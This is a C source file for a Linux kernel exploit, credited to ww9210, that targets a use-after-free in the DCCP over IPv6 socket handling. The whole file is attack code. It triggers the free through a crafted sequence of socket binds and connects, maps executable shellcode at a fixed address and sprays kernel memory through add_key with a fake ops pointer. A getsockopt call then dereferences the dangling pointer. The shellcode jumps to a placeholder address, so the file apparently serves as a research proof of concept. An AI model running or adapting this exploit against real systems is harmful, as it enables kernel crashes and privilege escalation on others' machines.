/*
#######   CREDITS  ############
Mohamed Ghannam
*/
/*
 * exploit written by ww9210
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <netinet/in.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/mman.h>
#include <keyutils.h>
#include "libexp.h"

#define SOL_DCCP 269
#define CRASH_IP 0xffffffffdeadbeef
#define FAKE_OPS 0xffffffff824eaf8d // +0xd0 points to 0xffffff, something inside init_net
#define SC_ADDR 0xfff000
#define SC "H\xc7\xc0\xef\xbe\xad\xde\xff\xe0" // mov rax, 0xffffffffdeadbeef; jmp rax
#define SPRAY_NUM 1

int fd1, fd2;
struct sockaddr_in6 in1, in2;
char payload[0x10];

int free_fd;
struct sockaddr_in6 free_cin;

char *addr;
int do_uaf()
{
	struct sockaddr_in6 cin1, cin2;
	int ret;

	fd1 = socket(AF_INET6, SOCK_DCCP, IPPROTO_IP);
	if(fd1<0){
		perror("socket");
	}

	memset(&in1,0,sizeof(in1));
	in1.sin6_family = AF_INET6;
	in1.sin6_addr = in6addr_loopback;
	in1.sin6_port = 0x214e;//htons(0x1000);
	ret=bind(fd1,(struct sockaddr*)&in1,sizeof(in1));
	if(ret<0){
		perror("bind");
	}
	ret=listen(fd1,0x1);
	if(ret<0){
		perror("listen");
	}

	fd2 = socket(AF_INET6, SOCK_DCCP, IPPROTO_IP);
	if(fd2<0){
		perror("socket");
	}

	memset(&cin1,0,sizeof(cin1));
	cin1.sin6_family = AF_INET6;
	cin1.sin6_addr = in6addr_loopback;
	cin1.sin6_port = 0x214e;//htons(0x1000);
	cin1.sin6_flowinfo = 0;
	ret=connect(fd2,(struct sockaddr*)&cin1,sizeof(cin1));
	if(fd2<0){
		perror("socket");
	}

	memset(&cin2,0,sizeof(cin2));
	ret=connect(fd1,(struct sockaddr*)&cin2,sizeof(cin2));
	if(ret<0){
		perror("connect");
	}
	memset(&in2,0,sizeof(in2));

	in2.sin6_family = AF_INET6;
	in2.sin6_addr = in6addr_loopback;
	in2.sin6_port = htons(0x6f0);
	in2.sin6_flowinfo = 0x2;
	in2.sin6_scope_id = 6;
	ret=bind(fd2,(struct sockaddr*)&in2,sizeof(in2));
	if(ret<0){
		perror("bind");
	}

	struct sockaddr_in6 cin3;
	memset(&cin3,0,sizeof(cin3));
	ret=connect(fd2,(struct sockaddr*)&cin3,sizeof(cin3));
	if(ret<0){
		perror("connect");
	}

	ret=listen(fd2,0xb1);
	if(ret<0){
		perror("listen");
	}

	struct sockaddr_in6 cin4;
	memset(&cin4,0,sizeof(cin4));
	cin4.sin6_family = AF_INET6;
	cin4.sin6_port = htons(0x6f0);//htons(0x3000);
	memset(&cin4.sin6_addr,0,sizeof(struct in6_addr));
	cin4.sin6_flowinfo = 1;
	cin4.sin6_scope_id = 0x32f1;
	ret=connect(fd1,(struct sockaddr*)&cin4,sizeof(cin4));
	if(ret<0){
		perror("connect");
	}
	return fd2;
}

void prepare_free()
{
	int fd1, fd2;
	struct sockaddr_in6 in1, in2;
	struct sockaddr_in6 cin1, cin2;
	int ret;

	memset(&in1,0,sizeof(in1));

	fd1 = socket(AF_INET6, SOCK_DCCP, IPPROTO_IP);

	in1.sin6_family = AF_INET6;
	in1.sin6_addr = in6addr_loopback;
	in1.sin6_port = 0x214f;//htons(0x1000);

	// fd1 bind and listen
	ret=bind(fd1,(struct sockaddr*)&in1,sizeof(in1));
	ret=listen(fd1, 0x1);

	// fd2 connects to fd1
	fd2 = socket(AF_INET6, SOCK_DCCP, IPPROTO_IP);
	memset(&cin1,0,sizeof(cin1));
	cin1.sin6_family = AF_INET6;
	cin1.sin6_addr = in6addr_loopback;
	cin1.sin6_port = 0x214f;//htons(0x1000);
	cin1.sin6_flowinfo = 0;
	ret=connect(fd2,(struct sockaddr*)&cin1,sizeof(cin1));

	// fd1 is binding, connect fd1
	memset(&cin2,0,sizeof(cin2));
	//ret=connect(fd1,(struct sockaddr*)&cin2,sizeof(cin2));

	free_fd = fd1;
	free_cin = cin2;
}

void payload_setup()
{
	// setup fake ops
	long *ptr = (long *)payload;
	ptr[0] = FAKE_OPS;
	ptr[1] = 0;

	// setup shellcode
	addr = mmap((void*)SC_ADDR, 0x2000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
	if(addr != (void *)SC_ADDR) error_out("mmap failed");

	memcpy(addr+0xfff, SC, sizeof(SC));

	prepare_free();
}

void hook(void *addr)
{
	sleep(2);
}

struct spray_struct *spray;
void context_setup()
{
	//init_univ_spray();
	//spray = prepare_univ_spray(payload, 0xf, SPRAY_NUM, hook);
}

void do_spray(void)
{
	// the initial freelist is victim->stuff, free an extra objec to make it
	// padding->victim->stuff
	connect(free_fd, (struct sockaddr*)&free_cin, sizeof(free_cin));
	add_key_desc_spray_num(payload, 0x200);
}

int main(void)
{
	payload_setup();
	context_setup();

	int val = 0x4142;
	socklen_t l=sizeof(val);

	do_uaf();
	nonsense();

	do_spray();

	// syscall that dereference the dangling pointer
	getsockopt(fd2, SOL_DCCP, 130, (void*)0x41424344, &l);

	return 0;
}
